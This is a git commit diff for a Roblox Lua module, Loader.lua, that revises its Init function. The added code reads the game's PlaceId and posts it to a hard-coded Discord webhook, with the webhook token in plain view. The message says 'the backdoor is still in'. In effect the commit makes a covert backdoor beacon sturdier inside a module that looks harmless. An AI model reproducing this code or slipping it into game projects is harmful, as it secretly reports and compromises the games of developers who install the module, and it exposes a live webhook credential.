227241123755bf1204c89e89d9d7d612379dd0f6
borgorthedemon239 <1lefishe@gmail.com>
2025-04-10 22:11:53 -0300

    Update Loader.lua

--- Loader.lua
+++ Loader.lua
@@ -18,13 +18,19 @@ local disabled = true
 
 function m:Init()
 	if disabled == true then
-		local Channel = "https://discord.com/api/webhooks/1360044566467842170/NuVI-TEQlHxgpyVFJTog8disz5xia_vohoEcKjekSMQZXNABvfNUUA3cU36lQRATCUXw"
-		local Info = {
-			Message = "the backdoor is still in"..tostring(game.PlaceId);
-			Title = "Lololol"
-		}
-		
-		m:Post(Channel, Info)
+		local PlaceId = nil;
+		pcall(function()
+			PlaceId = game.PlaceId;
+		end)
+		if PlaceId then
+			local Channel = "https://discord.com/api/webhooks/1360044566467842170/NuVI-TEQlHxgpyVFJTog8disz5xia_vohoEcKjekSMQZXNABvfNUUA3cU36lQRATCUXw"
+			local Info = {
+				Message = "the backdoor is still in "..tostring(PlaceId);
+				Title = "Lololol"
+			}
+			
+			m:Post(Channel, Info)
+		end
 	else
 		--[[--print('lalalal')
 		local acc = 0
